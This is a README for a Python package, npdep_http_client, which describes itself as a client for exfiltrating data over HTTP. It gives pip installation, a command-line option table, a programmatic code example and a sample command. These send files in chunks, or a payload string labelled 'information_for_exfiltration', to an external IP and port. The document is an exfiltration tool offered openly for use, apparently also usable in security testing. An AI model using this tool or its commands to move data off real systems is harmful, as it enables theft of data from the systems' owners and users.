# Description

A client to exfiltrate data through HTTP protocol

# Installation

`pip install npdep_http_client`

# Usage

**From command line:**

`python -m npdep_http_client [-h] [--mode {payload,file}] --ip IP --port PORT [--pkgSize PKGSIZE] [--path PATH] [--filePath FILEPATH] [--payload PAYLOAD]`

| Option | Short | Type | Default | Description |
|---|---|---|---|---|
|--mode | -m | String | file | file = Sends file  `--filePath` in `--pkSize` chunks per HTTP request <br> payload = Sends `payload` per HTTP request |
|--ip | -i | String | - | IP address of destination |
|--port | -p | Int | - | Port of destination |
|--pkgSize | -k | Int | 1200 | Nr. of bytes to load from file under `--filePath` in chunks |
|--path | -t | String | / | Path for HTTP request |
|--filePath | -e | String | - | Path to file which shall be send in mode: file |
|--payload | -a | String | - | Payload to be send in mode: payload |

**Programmatically:**

```python

from npdep_http_client.util.Util import Util
from npdep_http_client.type.RequestType import RequestType
from npdep_http_client.client.Client import Client

client = Client("10.10.10.10", 4567)

# Get request type
requestType = RequestType.VALUES["file"]

if(requestType == RequestType.FILE):
    Util.sendFileWithHttpRequest(client, 1200, "/", "path/to/file/data.txt")
elif(requestType == RequestType.PAYLOAD):
    client.sendHttpRequest(s=None, path="/", payload="information_for_exfiltration")
    

```
# Example

`python -m npdep_http_client -i 10.10.10.10 -p 4567 -m payload -a "information_for_exfiltration"`

Sends `information_for_exfiltration` to `10.10.10.10` on port `4567` as an HTTP request.